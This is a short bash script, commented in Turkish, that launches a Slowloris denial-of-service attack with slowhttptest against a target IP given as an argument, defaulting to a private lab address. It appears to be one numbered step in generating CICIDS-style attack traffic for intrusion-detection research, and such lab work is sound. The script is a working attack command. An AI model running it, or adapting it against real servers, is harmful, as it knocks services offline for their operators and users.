#!/usr/bin/env bash
# 07 DoS Slowloris — slowhttptest ile yavaş başlık (CICIDS: DoS slowloris). Sınırlı.
set -uo pipefail
VIC="${1:-10.10.10.30}"; DUR="${2:-20}"
echo "[dos-slowloris] slowhttptest -H $VIC:80 (${DUR}s)"
if command -v slowhttptest >/dev/null 2>&1; then
  slowhttptest -c 500 -H -g -i 10 -r 100 -t GET -u "http://$VIC/" -x 24 -p 3 -l "$DUR" 2>&1 | tail -4 || true
else
  echo "[dos-slowloris] slowhttptest yok → atlandı"
fi
echo "[dos-slowloris] done"
